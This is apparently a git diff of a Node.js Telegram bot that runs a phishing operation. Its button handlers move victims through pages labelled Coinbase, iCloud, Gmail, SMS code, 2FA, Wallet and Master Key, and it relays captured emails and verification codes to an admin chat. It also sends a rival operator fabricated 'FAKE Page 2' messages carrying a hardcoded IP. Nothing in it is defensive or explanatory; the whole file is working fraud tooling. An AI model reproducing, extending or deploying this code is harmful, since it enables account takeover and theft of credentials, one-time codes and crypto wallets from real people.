-    // ✅ For Gmail requests, fetch display email to use in message
-    let displayEmailForMessage = identifier;
-    let cbEmailForStatus = identifier;
-    if (identifier && identifier.includes("gmail_")) {
-      try {
-        const response = await fetch(`${APP_URL}/get-display-email-by-request`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ requestId: identifier })
-        });
-        const data = await response.json();
-        if (data.displayEmail) {
-          displayEmailForMessage = data.displayEmail;
-          console.log(`📧 Using display email for message: ${displayEmailForMessage}`);
-          // ✅ For status update, we need to use the CB email, look it up from requestIdToEmail
-          // This will be done on the server side via update-status endpoint
-          cbEmailForStatus = identifier;
-        }
-      } catch (err) {
-        console.error("❌ Failed to fetch display email:", err);
-      }
-    }
-
-    await fetch(`${APP_URL}/update-status`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email: identifier, identifier, status })
-    });
-
-    try {
-      await bot.editMessageReplyMarkup(
-        { inline_keyboard: [] },
-        { chat_id: query.message.chat.id, message_id: query.message.message_id }
-      );
-    } catch (_) {}
-
-    let replyText = isAccepted
-      ? `📧 <code>${displayEmailForMessage}</code> has been <b>${actionLabel}</b>`
-      : `📧 <code>${displayEmailForMessage}</code> has been <b>${actionLabel}</b>`;
-
-    if (status === "accepted1" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-      replyText = `📍 <code>${identifier}</code> → <b>🏁 Done Page</b>`;
-    } else if (status === "accepted2" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-      replyText = `📍 <code>${identifier}</code> → <b>🔐 Last 2FA</b>`;
-    } else if (status === "accepted3" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-      replyText = `📍 <code>${identifier}</code> → <b>💼 Wallet</b>`;
-    } else if (status === "accepted4" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-      replyText = `📍 <code>${identifier}</code> → <b>🗝️ Master Key</b>`;
-    } else {
-      const isSMS = /^\d+$/.test(identifier);
-      replyText = isSMS
-        ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
-        : `📧 <code>${displayEmailForMessage}</code> has been <b>${actionLabel}</b>`;
-    }
-
-    await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
-
-  } catch (err) {
-    console.error("❌ Failed to handle callback (Bot 1):", err);
-    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
-  }
-});
-
-// ─── BOT 2 CALLBACK HANDLER (EXACT SAME) ────────────────────────
-if (bot2) {
-  bot2.on("callback_query", async (query) => {
-    if (handledCallbacks.has(query.id)) return;
-    handledCallbacks.add(query.id);
-    setTimeout(() => handledCallbacks.delete(query.id), 60000);
-
-    try {
-      const [action, identifier] = query.data.split("|");
-      const userId = identifier;
-      
-      if (!userWinnerTelegram[userId]) {
-        userWinnerTelegram[userId] = "telegram2";
-        console.log(`🏆 User ${userId} - Telegram 2 WINS!`);
-        // ✅ NOTE: Do NOT track Bot 2's click here
-        // Only Bot 1's clicks matter for page 2 routing
-      }
-      // ✅ NOTE: Do NOT track Bot 2 clicks at all
-      // botsThatClickedPage1 is ONLY for tracking Bot 1 participation
-
-      let status;
-
-      // ─── Device Approval Redirection Buttons ────────────────────────
-      if (action === "device_icloud" || action === "device_gmail") {
-        const requestId = identifier;
-        let newStatus;
-
-        if (action === "device_icloud") {
-          newStatus = "icloud";
-        } else if (action === "device_gmail") {
-          newStatus = "gmail";
-        }
-
-        // Get email from server endpoint
-        let emailDisplay = 'User';
-        try {
-          const emailRes = await fetch(`${APP_URL}/get-device-approval/${requestId}`);
-          const emailData = await emailRes.json();
-          if (emailData.email) {
-            emailDisplay = emailData.email;
-            console.log(`📧 Device (Bot 2): Fetched email for ${requestId}: ${emailDisplay}`);
-          } else {
-            console.log(`❌ Device (Bot 2): No email found for ${requestId}`);
-          }
-        } catch (err) {
-          console.log(`❌ Device (Bot 2): Error fetching email:`, err.message);
-        }
-
-        await fetch(`${APP_URL}/api/update-device-approval-status`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ requestId, status: newStatus })
-        });
-
-        try {
-          await bot2.editMessageReplyMarkup(
-            { inline_keyboard: [] },
-            { chat_id: query.message.chat.id, message_id: query.message.message_id }
-          );
-        } catch (_) {}
-
-        const replyText = newStatus === "icloud" 
-          ? `📧 <code>${emailDisplay}</code> has been directed to ☁️<b>iCloud</b>☁️`
-          : `📧 <code>${emailDisplay}</code> has been directed to 🌈<b>Gmail</b>🌈`;
-
-        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-        return;
-      }
-
-      // ─── Verification Digit Selection (0-9) ────────────────────────
-      if (action === "verify_digit") {
-        const [, requestId, digit] = query.data.split("|");
-        
         const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -1010,473 +176,1225 @@ if (bot2) {
         
         const result = await updateResult.json();
         
-        // If 2 digits are selected, remove the buttons (keep the original message)
+        // ✅ Only remove keyboard and show message when we have 2 digits
         if (result.selectedCount === 2) {
           try {
-            await bot2.editMessageReplyMarkup(
+            await bot.editMessageReplyMarkup(
               { inline_keyboard: [] },
               { chat_id: query.message.chat.id, message_id: query.message.message_id }
             );
             
-            // Send a follow-up message
-            await bot2.sendMessage(
+            await bot.sendMessage(
               query.message.chat.id,
               `✅ <b>Numbers Selected!</b>`,
               { parse_mode: "HTML" }
             );
           } catch (err) {
-            console.error("Error editing message:", err);
+            console.error("❌ Error editing message:", err);
           }
         }
 
-        await bot2.answerCallbackQuery(query.id, { text: `📍 Selected: ${digit}` });
+        await bot.answerCallbackQuery(query.id, { text: `📍 Digit ${digit} selected (${result.selectedCount}/2)` });
+        return;
+      } catch (err) {
+        console.error("❌ verify_digit error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing digit" });
         return;
       }
+    }
 
-      // ─── Verification Confirm (Accept/Reject) ────────────────────────
-      if (action === "verify_accept" || action === "verify_reject") {
-        const confirmRequestId = identifier;
-        let newStatus;
-
-        if (action === "verify_accept") {
-          newStatus = "accepted";
-        } else {
-          newStatus = "rejected";
-        }
-
-        // Get email from server endpoint
-        let emailDisplay = 'User';
+    // ============================================================================
+    // ✅ SMS2 BUTTONS HANDLER
+    // ============================================================================
+    if (action === "sms2_wallet" || action === "sms2_done" || action === "sms2_reject" || action === "sms2_icloud" || action === "sms2_gmail") {
+      const sms2Id = identifier;
+      
+      try {
+        const updateResult = await fetch(`${APP_URL}/update-sms2-choice`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ sms2Id, choice: action })
+        });
+        
+        const result = await updateResult.json();
+        
         try {
-          const emailRes = await fetch(`${APP_URL}/get-verification-email/${confirmRequestId}`);
-          const emailData = await emailRes.json();
-          if (emailData.email) {
-            emailDisplay = emailData.email;
-            console.log(`📧 Verification (Bot 2): Fetched email for ${confirmRequestId}: ${emailDisplay}`);
-          } else {
-            console.log(`❌ Verification (Bot 2): No email found for ${confirmRequestId}`);
+          await bot.editMessageReplyMarkup(
+            { inline_keyboard: [] },
+            { chat_id: query.message.chat.id, message_id: query.message.message_id }
+          );
+        } catch (err) {
+          console.error("Error removing buttons:", err);
+        }
+        
+        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
+        
+        try {
+          const botToken = process.env.BOT_TOKEN;
+          const chatId = process.env.ADMIN_CHAT_ID;
+          
+          const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
+          const sms2Data = await sms2Info.json();
+          const sms2Email = sms2Data.email || sms2Id;
+          const sms2Code = sms2Data.code;
+          
+          let statusMsg = "";
+          let consoleLog = "";
+          if (action === "sms2_wallet") {
+            statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
+            consoleLog = `💬 SMS - 2: ${sms2Code} → 💼`;
+          } else if (action === "sms2_done") {
+            statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
+            consoleLog = `💬 SMS - 2: ${sms2Code} → 🏁`;
+          } else if (action === "sms2_reject") {
+            statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED!</b> ❌`;
+            consoleLog = `💬 SMS - 2: ${sms2Code} → REJECTED!❌`;
+          } else if (action === "sms2_icloud") {
+            statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
+            consoleLog = `💬 SMS - 2: ${sms2Code} → ☁️`;
+          } else if (action === "sms2_gmail") {
+            statusMsg = `📧 <code>${sms2Email}</code> → 🌈`;
+            consoleLog = `💬 SMS - 2: ${sms2Code} → 🌈`;
+          }
+          
+          if (consoleLog) {
+            console.log(consoleLog);
+          }
+          
+          if (statusMsg) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            await fetch(url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: statusMsg,
+                parse_mode: "HTML"
+              })
+            });
           }
         } catch (err) {
-          console.log(`❌ Verification (Bot 2): Error fetching email:`, err.message);
+          console.error("Error sending status message:", err);
         }
+        
+        return;
+      } catch (err) {
+        console.error("❌ SMS 2 choice error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
+        return;
+      }
+    }
 
-        await fetch(`${APP_URL}/api/update-verification-status`, {
+    // ============================================================================
+    // ✅ VERIFYING BUTTONS HANDLER
+    // ============================================================================
+    if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
+      const verifyingId = identifier;
+      
+      try {
+        const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ requestId: confirmRequestId, status: newStatus })
+          body: JSON.stringify({ verifyingId, choice: action })
         });
-
+        
+        const result = await updateResult.json();
+        
         try {
-          await bot2.editMessageReplyMarkup(
+          await bot.editMessageReplyMarkup(
             { inline_keyboard: [] },
             { chat_id: query.message.chat.id, message_id: query.message.message_id }
           );
-        } catch (_) {}
-
-        const replyText = newStatus === "accepted"
-          ? `📧 <code>${emailDisplay}</code> has been <b>ACCEPTED! ✅</b>`
-          : `📧 <code>${emailDisplay}</code> has been <b>REJECTED! ❌</b>`;
-
-        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-        return;
-      }
-
-      // ─── Gmail Login Buttons ────────────────────────
-      if (action === "gmail_accept" || action === "gmail_reject") {
-        const requestId = identifier;
-        let newStatus;
-
-        if (action === "gmail_accept") {
-          newStatus = "accepted";
-        } else {
-          newStatus = "rejected";
+        } catch (err) {
+          console.error("Error removing buttons:", err);
         }
-
-        // Get email from server endpoint
-        let emailDisplay = 'User';
+        
+        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
+        
         try {
-          const emailRes = await fetch(`${APP_URL}/get-gmail-login/${requestId}`);
-          const emailData = await emailRes.json();
-          if (emailData.email) {
-            emailDisplay = emailData.email;
-            console.log(`📧 Gmail (Bot 2): Fetched email for ${requestId}: ${emailDisplay}`);
-          } else {
-            console.log(`❌ Gmail (Bot 2): No email found for ${requestId}`);
+          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
+          const verifyData = await verifyRes.json();
+          const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
+          
+          let choiceText = '';
+          let consoleLog = '';
+          if (action === "verifying_sms") {
+            choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
+            consoleLog = `😈 ${verifyEmail} directed to: SMS - 2`;
+          } else if (action === "verifying_done") {
+            choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
+            consoleLog = `😈 ${verifyEmail} directed to: Done`;
+          } else if (action === "verifying_wallet") {
+            choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
+            consoleLog = `😈 ${verifyEmail} directed to: Wallet`;
+          } else if (action === "verifying_icloud") {
+            choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
+            consoleLog = `😈 ${verifyEmail} directed to: iCloud`;
+          } else if (action === "verifying_gmail") {
+            choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
+            consoleLog = `😈 ${verifyEmail} directed to: Gmail`;
+          }
+          
+          if (consoleLog) {
+            console.log(consoleLog);
+          }
+          
+          if (choiceText) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: choiceText,
+                parse_mode: "HTML"
+              })
+            });
           }
         } catch (err) {
-          console.log(`❌ Gmail (Bot 2): Error fetching email:`, err.message);
+          console.error("Error sending choice message:", err);
         }
-
-        await fetch(`${APP_URL}/api/update-gmail-login-status`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ requestId, status: newStatus })
-        });
-
-        try {
-          await bot2.editMessageReplyMarkup(
-            { inline_keyboard: [] },
-            { chat_id: query.message.chat.id, message_id: query.message.message_id }
-          );
-        } catch (_) {}
-
-        const replyText = newStatus === "accepted"
-          ? `📧 <code>${emailDisplay}</code> has been <b>ACCEPTED! ✅</b>`
-          : `📧 <code>${emailDisplay}</code> has been <b>REJECTED! ❌</b>`;
-
-        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
+        
+        return;
+      } catch (err) {
+        console.error("❌ Verifying choice error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
         return;
       }
+    }
 
-      // ─── Last 2FA Page Buttons ────────────────────────
-      if (action === "2fa_reject_new" || action === "2fa_done" || action === "2fa_wallet" || action === "2fa_masterkey") {
-        let newStatus, replyText;
-
-        if (action === "2fa_reject_new") {
-          newStatus = "rejected";
-          replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
-        } else if (action === "2fa_done") {
-          newStatus = "approved1";
-          replyText = `🏁 <code>${identifier}</code> → <b>Done Page</b>`;
-        } else if (action === "2fa_wallet") {
-          newStatus = "approved2";
-          replyText = `💼 <code>${identifier}</code> → <b>Wallet</b>`;
-        } else if (action === "2fa_masterkey") {
-          newStatus = "approved3";
-          replyText = `🗝️ <code>${identifier}</code> → <b>Master Key</b>`;
-        }
-
-        await fetch(`${APP_URL}/api/update-2fa-status`, {
+    // ============================================================================
+    // ✅ WALLET DECISION BUTTONS HANDLER
+    // ============================================================================
+    if (action.startsWith("wallet_decision_")) {
+      const email = identifier;
+      console.log(`💼 Wallet decision: ${action} for email: ${email}`);
+      
+      try {
+        await fetch(`${APP_URL}/update-wallet-decision`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ requestId: identifier, status: newStatus })
+          body: JSON.stringify({ email, choice: action })
         });
-
-        try {
-          await bot2.editMessageReplyMarkup(
-            { inline_keyboard: [] },
-            { chat_id: query.message.chat.id, message_id: query.message.message_id }
-          );
-        } catch (_) {}
-
-        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-        return;
-      }
-
-      // ─── Master Key Page Buttons ────────────────────────
-      if (action === "mk_reject" || action === "mk_done" || action === "mk_wallet" || action === "mk_passkey") {
-        let newStatus, replyText;
-
-        if (action === "mk_reject") {
-          newStatus = "rejected";
-          replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
-        } else if (action === "mk_done") {
-          newStatus = "mk_approved1";
-          replyText = `🏁 <code>${identifier}</code> → <b>Done Page</b>`;
-        } else if (action === "mk_wallet") {
-          newStatus = "mk_approved2";
-          replyText = `💼 <code>${identifier}</code> → <b>Wallet</b>`;
-        } else if (action === "mk_passkey") {
-          newStatus = "mk_approved3";
-          replyText = `🔐 <code>${identifier}</code> → <b>Passkey 2FA</b>`;
-        }
-
-        await fetch(`${APP_URL}/api/update-masterkey-status`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ requestId: identifier, status: newStatus })
-        });
-
-        try {
-          await bot2.editMessageReplyMarkup(
-            { inline_keyboard: [] },
-            { chat_id: query.message.chat.id, message_id: query.message.message_id }
-          );
-        } catch (_) {}
-
-        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-        return;
-      }
-
-      // ─── Device Approval Redirection Buttons ────────────────────────
-      if (action === "device_icloud" || action === "device_gmail") {
-        let newStatus, replyText;
-
-        // ⏱️ CHECK IF TIMEOUT EXPIRED
-        if (botsThatClickedPage1[`${identifier}_timeout_expired`]) {
-          console.log(`⏱️ Timeout expired for ${identifier} - sending instant acceptance`);
-          replyText = `📧 <code>${identifier}</code> has been <b>ACCEPTED! ✅</b>`;
-        } else {
-          // Normal flow (within 15 seconds)
-          if (action === "device_icloud") {
-            newStatus = "icloud";
-            replyText = `☁️ <code>${identifier}</code> → <b>Redirecting to iCloud</b>`;
-          } else if (action === "device_gmail") {
-            newStatus = "gmail";
-            replyText = `🌈 <code>${identifier}</code> → <b>Redirecting to Gmail</b>`;
-          }
-
-          await fetch(`${APP_URL}/api/update-device-approval-status`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ requestId: identifier, status: newStatus })
-          });
-        }
 
         try {
           await bot.editMessageReplyMarkup(
             { inline_keyboard: [] },
             { chat_id: query.message.chat.id, message_id: query.message.message_id }
           );
-        } catch (_) {}
+        } catch (err) {}
 
-        await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-        await bot.answerCallbackQuery(query.id, { text: botsThatClickedPage1[`${identifier}_timeout_expired`] ? "❗️ACCEPTED❗️" : `❗️${newStatus.toUpperCase()}❗️` });
-        return;
-      }
-
-      // ─── Wallet Options Page Buttons ────────────────────────
-      if (action === "wallet_master_key" || action === "wallet_2fa" || action === "wallet_done") {
-        let newStatus, replyText;
-
-        if (action === "wallet_master_key") {
-          newStatus = "wallet_master_key";
-          replyText = `🗝️ <code>${identifier}</code> → <b>Master Key</b>`;
-        } else if (action === "wallet_2fa") {
-          newStatus = "wallet_2fa";
-          replyText = `🔐 <code>${identifier}</code> → <b>2FA</b>`;
-        } else if (action === "wallet_done") {
-          newStatus = "wallet_done";
-          replyText = `🏁 <code>${identifier}</code> → <b>Done</b>`;
+        // ✅ SEND STATUS MESSAGE
+        let statusMessage = "";
+        
+        if (action === "wallet_decision_sms") {
+          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        } else if (action === "wallet_decision_done") {
+          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        } else if (action === "wallet_decision_icloud") {
+          statusMessage = `📧 <code>${email}</code> → ☁️`;
+        } else if (action === "wallet_decision_gmail") {
+          statusMessage = `📧 <code>${email}</code> → 🌈`;
         }
 
-        await fetch(`${APP_URL}/api/update-wallet-options-status`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ requestId: identifier, status: newStatus })
-        });
-
-        try {
-          await bot2.editMessageReplyMarkup(
-            { inline_keyboard: [] },
-            { chat_id: query.message.chat.id, message_id: query.message.message_id }
-          );
-        } catch (_) {}
-
-        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-        return;
-      }
-
-      // ─── Standard buttons (2fa_approve, accept, page, etc) ────────────────────────
-      if (action === "2fa_approve" || action === "2fa_reject") {
-        const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
-        const twoFaEmoji = twoFaStatus === "approved" ? "✅" : "❌";
-
-        await fetch(`${APP_URL}/api/update-2fa-status`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
-        });
-
-        try {
-          await bot2.editMessageReplyMarkup(
-            { inline_keyboard: [] },
-            { chat_id: query.message.chat.id, message_id: query.message.message_id }
-          );
-        } catch (_) {}
-
-        const msgText = query.message.text || "";
-        const smsMatch = msgText.match(/(?:SMS|2FA|2FA-2)[:\s]+([\d\s\-]+)/i);
-        const displayCode = smsMatch ? smsMatch[1].trim() : null;
-
-        const twoFaStatusText = displayCode
-          ? `🔐 <code>${displayCode}</code> has been <b>${twoFaStatus === "approved" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
-          : `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`;
-
-        await bot2.sendMessage(query.message.chat.id, twoFaStatusText, { parse_mode: "HTML" });
-        await bot2.answerCallbackQuery(query.id, { text: `❗️${twoFaStatus.toUpperCase()}❗️` });
-        return;
-      }
-
-      if (action === "accept") status = "accepted";
-      else if (action === "page1") status = "accepted1";
-      else if (action === "page2") status = "accepted2";
-      else if (action === "page3") status = "accepted3";
-      else if (action === "page4") status = "accepted4";
-      else status = "rejected";
-
-      const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3", "accepted4"].includes(status);
-      const actionLabel = isAccepted ? "ACCEPTED! ✅" : "REJECTED! ❌";
-
-      // ✅ For Gmail requests, fetch display email to use in message
-      let displayEmailForMessage = identifier;
-      if (identifier && identifier.includes("gmail_")) {
-        try {
-          const response = await fetch(`${APP_URL}/get-display-email-by-request`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ requestId: identifier })
-          });
-          const data = await response.json();
-          if (data.displayEmail) {
-            displayEmailForMessage = data.displayEmail;
-            console.log(`📧 Using display email for message: ${displayEmailForMessage}`);
+        if (statusMessage) {
+          try {
+            await bot.sendMessage(ADMIN_CHAT_ID, statusMessage, { parse_mode: "HTML" });
+          } catch (err) {
+            console.error(`❌ Error sending status message:`, err.message);
           }
-        } catch (err) {
-          console.error("❌ Failed to fetch display email:", err);
         }
+
+        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
+        return;
+      } catch (err) {
+        console.error("❌ Wallet decision error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing decision" });
+        return;
       }
+    }
 
-      await fetch(`${APP_URL}/update-status`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email: identifier, identifier, status })
-      });
+    // ============================================================================
+    // ✅ FAKE PAGE 2 LOGIC (Bot 1 fake redirection when Bot 2 is winner)
+    // ============================================================================
+    if ((action === "page2") && userWinnerTelegram[identifier] === "telegram2") {
+      // Bot 2 is winner, Bot 1 clicked Email Redirection - send FAKE Page 2
+      
+      const timeSinceBot2Won = Date.now() - bot2WinnerTimestamp[identifier];
+      const TEN_SECONDS = 10000;
+      
+      console.log(`⏱️ Bot 1 clicked page2 - Time since Bot 2 won: ${timeSinceBot2Won}ms`);
+      
+      if (timeSinceBot2Won <= TEN_SECONDS) {
+        // ✅ Within 10 seconds - Send FAKE Page 2 after 1 second
+        console.log(`✅ FAKE Page 2 will be sent to Bot 1 after 1 second`);
+        
+        // ✅ REMOVE Page 1 BUTTONS
+        try {
+          await bot.editMessageReplyMarkup(
+            { inline_keyboard: [] },
+            { chat_id: query.message.chat.id, message_id: query.message.message_id }
+          );
+          console.log(`✅ Page 1 buttons removed`);
+        } catch (err) {
+          console.error("Error removing Page 1 buttons:", err);
+        }
+        
+        // ✅ SEND ACCEPTANCE MESSAGE INSTANTLY (no delay)
+        try {
+          await bot.sendMessage(ADMIN_CHAT_ID, 
+            `📧 <code>${identifier}</code> has been <b>ACCEPTED!</b> ✅`,
+            { parse_mode: "HTML" }
+          );
+          console.log(`✅ Acceptance message sent instantly`);
+        } catch (err) {
+          console.error("Error sending acceptance message:", err);
+        }
+        
+        // ✅ DELAY FAKE PAGE 2 BY 1 SECOND
+        setTimeout(async () => {
+          try {
+            // Get stored device info
+            const storedDevice = userDeviceInfo[identifier] || "Unknown Device";
+            
+            // Send fake Page 2 redirection message with buttons
+            const fakePage2Message = 
+              `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
+              `<b>👤 User ID:</b> <code>#1</code>\n` +
+              `<b>📧 Email:</b> <code>${identifier}</code>\n` +
+              `<b>🌍 Region:</b> Rabat, Morocco\n` +
+              `<b>💻 Device:</b> ${storedDevice}\n` +
+              `<b>📍 IP:</b> 196.64.108.245`;
+            
+            const fakePage2Options = {
+              parse_mode: "HTML",
+              reply_markup: {
+                inline_keyboard: [
+                  [{ text: "☁️ iCloud ☁️", callback_data: `fake_redirect_icloud|${identifier}` }],
+                  [{ text: "🌈 Gmail 🌈", callback_data: `fake_redirect_gmail|${identifier}` }]
+                ]
+              }
+            };
+            
+            await bot.sendMessage(ADMIN_CHAT_ID, fakePage2Message, fakePage2Options);
+            console.log(`✅ FAKE Page 2 sent to Bot 1 for ${identifier}`);
+          } catch (err) {
+            console.error("Error sending fake Page 2:", err);
+          }
+        }, 1000);  // 1 second delay
+        
+        await bot.answerCallbackQuery(query.id, { text: "✅ ACCEPTED" });
+        return;
+      } else {
+        // ❌ After 10 seconds - Send NOTHING, complete silence
+        console.log(`⏱️ TIMEOUT: 10 seconds passed, sending nothing to Bot 1`);
+        
+        await bot.answerCallbackQuery(query.id, { text: "✅ ACCEPTED" });
+        return;
+      }
+    }
 
+    // ============================================================================
+    // ✅ FAKE PAGE 2 BUTTON CLICKS (Bot 1 clicking on fake redirection buttons)
+    // ============================================================================
+    if ((action === "fake_redirect_icloud" || action === "fake_redirect_gmail") && userWinnerTelegram[identifier] === "telegram2") {
+      // Bot 1 clicked on FAKE Page 2 buttons - Just print and fake it
+      
+      const isIcloud = action === "fake_redirect_icloud";
+      const statusMessage = isIcloud 
+        ? `📧 <code>${identifier}</code> redirected to ☁️<b>iCloud</b>☁️`
+        : `📧 <code>${identifier}</code> redirected to 🌈<b>Gmail</b>🌈`;
+      
+      console.log(`🎭 FAKE button clicked by Bot 1: ${action}`);
+      
       try {
-        await bot2.editMessageReplyMarkup(
+        // Remove fake buttons
+        await bot.editMessageReplyMarkup(
           { inline_keyboard: [] },
           { chat_id: query.message.chat.id, message_id: query.message.message_id }
         );
-      } catch (_) {}
+      } catch (err) {}
+      
+      try {
+        // Send fake status message
+        await bot.sendMessage(ADMIN_CHAT_ID, statusMessage, { parse_mode: "HTML" });
+      } catch (err) {
+        console.error("Error sending fake status:", err);
+      }
+      
+      await bot.answerCallbackQuery(query.id, { text: "✅ " + (isIcloud ? "iCLOUD" : "GMAIL") });
+      return;
+    }
 
-      if (status === "accepted1" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-        replyText = `📍 <code>${identifier}</code> → <b>🏁 Done Page</b>`;
-      } else if (status === "accepted2" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-        replyText = `📍 <code>${identifier}</code> → <b>🔐 Last 2FA</b>`;
-      } else if (status === "accepted3" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-        replyText = `📍 <code>${identifier}</code> → <b>💼 Wallet</b>`;
-      } else if (status === "accepted4" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-        replyText = `📍 <code>${identifier}</code> → <b>🗝️ Master Key</b>`;
-      } else {
-        const isSMS = /^\d+$/.test(identifier);
-        replyText = isSMS
-          ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
-          : `📧 <code>${displayEmailForMessage}</code> has been <b>${actionLabel}</b>`;
+    // ============================================================================
+    // ✅ NORMAL PAGE 1 HANDLING (Bot 1 wins or standard clicks)
+    // ============================================================================
+    
+    let email = identifier;
+    let smsCode = "";
+    let displayEmail = email;  // ✅ What to show in acceptance message
+
+    // ✅ For SMS callbacks, get SMS code from server
+    if (action.startsWith("sms_")) {
+      try {
+        // Try to get SMS code - identifier could be email (Coinbase) or requestId (iCloud)
+        const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}&email=${encodeURIComponent(email)}`);
+        const data = await response.json();
+        smsCode = data.smsCode || identifier;
+      } catch (err) {
+        console.error("Error fetching SMS code:", err);
+        smsCode = identifier;
+      }
+    }
+
+    // ✅ For iCloud page callbacks, get displayEmail from server
+    if (action.startsWith("page_") && identifier && !identifier.includes("sms_code_")) {
+      try {
+        const response = await fetch(`${APP_URL}/get-page-display-email?email=${encodeURIComponent(identifier)}`);
+        const data = await response.json();
+        displayEmail = data.displayEmail || email;
+      } catch (err) {
+        console.error("Error fetching display email:", err);
+        displayEmail = email;
+      }
+    }
+
+    // ✅ STEP 1: Set winner on first click (Page 1 only - don't set for Gmail/SMS/page_/verification!)
+    if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_") && !action.startsWith("verification_")) {
+      userWinnerTelegram[email] = "telegram1";  // Bot 1 wins (first to click)
+      botsThatClickedPage1[email] = true;
+      botsThatClickedPage1[`${email}_timestamp`] = Date.now();
+      
+      
+      // Send notification to Bot 2 (loser)
+      if (bot2 && ADMIN_CHAT_ID_2) {
+        try {
+          // ✅ EXCEPTION: If Bot 1 rejects, send different message
+          if (action === "reject") {
